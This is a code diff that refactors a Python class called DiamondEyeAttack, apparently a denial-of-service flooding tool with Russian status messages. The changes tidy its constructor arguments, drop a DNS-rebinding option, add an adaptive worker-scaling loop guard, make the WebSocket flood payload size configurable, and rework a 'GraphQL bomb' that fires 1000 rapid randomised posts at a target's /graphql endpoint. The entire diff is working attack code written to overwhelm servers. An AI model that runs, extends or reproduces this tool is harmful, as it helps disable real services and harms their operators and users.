@@ -17,9 +17,10 @@ class DiamondEyeAttack:
                  useragents: List[str], no_ssl_check: bool, debug: bool, proxy: str = None,
                  use_http2: bool = False, use_http3: bool = False, websocket: bool = False,
                  auth: str = None, h2reset: bool = False, graphql_bomb: bool = False,
-                 adaptive: bool = False, dns_rebind: bool = False, slow_rate: float = 0.0,
+                 adaptive: bool = False, slow_rate: float = 0.0,
                  extreme: bool = False, data_size: int = 0, flood: bool = False, path_fuzz: bool = False,
-                 header_flood: bool = False, method_fuzz: bool = False, args=None):
+                 header_flood: bool = False, method_fuzz: bool = False,
+                 junk: bool = False, random_host: bool = False):
         self.url = url
         self.workers = workers
         self.sockets = sockets
@@ -35,7 +36,6 @@ class DiamondEyeAttack:
         self.h2reset = h2reset
         self.graphql_bomb = graphql_bomb
         self.adaptive = adaptive
-        self.dns_rebind = dns_rebind
         self.slow_rate = slow_rate
         self.extreme = extreme
         self.data_size = data_size
@@ -43,11 +43,8 @@ class DiamondEyeAttack:
         self.path_fuzz = path_fuzz
         self.header_flood = header_flood
         self.method_fuzz = method_fuzz
-        self.args = args if args is not None else argparse.Namespace()
-
-        for attr in ['junk', 'header_flood', 'random_host']:
-            if not hasattr(self.args, attr):
-                setattr(self.args, attr, False)
+        self.junk = junk
+        self.random_host = random_host
 
         self.parsed_url = urlparse(url)
         self.host = self.parsed_url.netloc
@@ -128,9 +125,9 @@ class DiamondEyeAttack:
                     self.host,
                     self.useragents,
                     self.referers,
-                    use_junk=self.args.junk,
-                    use_random_host=self.args.random_host,
-                    header_flood=self.args.header_flood,
+                    use_junk=self.junk,
+                    use_random_host=self.random_host,
+                    header_flood=self.header_flood,
                     auth_token=self.auth
                 )
 
@@ -229,9 +226,9 @@ class DiamondEyeAttack:
                 self.host,
                 self.useragents,
                 self.referers,
-                use_junk=self.args.junk,
-                use_random_host=self.args.random_host,
-                header_flood=self.args.header_flood
+                use_junk=self.junk,
+                use_random_host=self.random_host,
+                header_flood=self.header_flood
             )
             for k, v in headers.items():
                 if self._shutdown_event.is_set():
@@ -316,22 +313,23 @@ class DiamondEyeAttack:
         return random.choice(self.methods)
 
     async def adaptive_attack(self):
+        if self.extreme:
+            print(f"{Fore.RED}🛑 --adaptive несовместим с --extreme{Style.RESET_ALL}")
+            return
+
         print(f"{Fore.CYAN}📈 Adaptive RPS: начали с {self.workers} воркеров{Style.RESET_ALL}")
         base_workers = self.workers
         fail_history = []
 
-        for step in range(30):  # Максимум 30 шагов
+        for step in range(30):
             if self._shutdown_event.is_set():
                 break
 
-            # Увеличиваем число воркеров (на 10% каждый шаг)
             self.workers = max(1, int(base_workers * (1.1 ** len(fail_history))))
             print(f"{Fore.YELLOW}🔄 Адаптив: {self.workers} воркеров | Шаг {step+1}{Style.RESET_ALL}")
 
-            # Краткая пауза перед статистикой
             await asyncio.sleep(1.0)
 
-            # Замер RPS и ошибки за 10 секунд
             start_sent = self.sent
             start_failed = self.failed
             await asyncio.sleep(10.0)
@@ -349,9 +347,7 @@ class DiamondEyeAttack:
 
             fail_history.append(fail_rate)
 
-        # После остановки — просто выходим
         print(f"{Fore.GREEN}✅ Адаптивная атака завершена{Style.RESET_ALL}")
-
 
     async def websocket_flood(self):
         print(f"{Fore.CYAN}🔗 WebSocket Flood: подключение к {self.url}...{Style.RESET_ALL}")
@@ -367,7 +363,8 @@ class DiamondEyeAttack:
             try:
                 async with websockets.connect(uri, ssl=(not self.no_ssl_check)) as ws:
                     while not self._shutdown_event.is_set():
-                        await ws.send(random_string(64))
+                        data = random_string(self.data_size) if self.data_size > 0 else random_string(64)
+                        await ws.send(data)
                         await asyncio.sleep(1)
             except (websockets.ConnectionClosed, OSError):
                 pass
@@ -378,18 +375,19 @@ class DiamondEyeAttack:
                     print(f"{Fore.RED}[WS] {e}{Style.RESET_ALL}")
             await asyncio.sleep(0.05)
 
-async def send_graphql_bomb(self):
-    print(f"{Fore.MAGENTA}💣 GraphQL Bomb: отправка 1000 запросов...{Style.RESET_ALL}")
-    url = self.url.rstrip("/") + "/graphql"
-    query = {"query": "{ __typename }"}
+    async def send_graphql_bomb(self):
+        print(f"{Fore.MAGENTA}💣 GraphQL Bomb: отправка 1000 запросов...{Style.RESET_ALL}")
+        url = self.url.rstrip("/") + "/graphql"
+        payload_size = self.data_size if self.data_size > 100 else 100
+        query = {"query": "{ " + random_string(payload_size) + " }"}
 
-    async with httpx.AsyncClient(timeout=30) as client:
-        for _ in range(1000):
-            if self._shutdown_event.is_set():
-                break
-            try:
-                await client.post(url, json=query)
-                self.sent += 1
-            except:
-                self.failed += 1
-            await asyncio.sleep(0.0001)
+        async with httpx.AsyncClient(timeout=30) as client:
+            for _ in range(1000):
+                if self._shutdown_event.is_set():
+                    break
+                try:
+                    await client.post(url, json=query)
+                    self.sent += 1
+                except:
+                    self.failed += 1
+                await asyncio.sleep(0.0001)
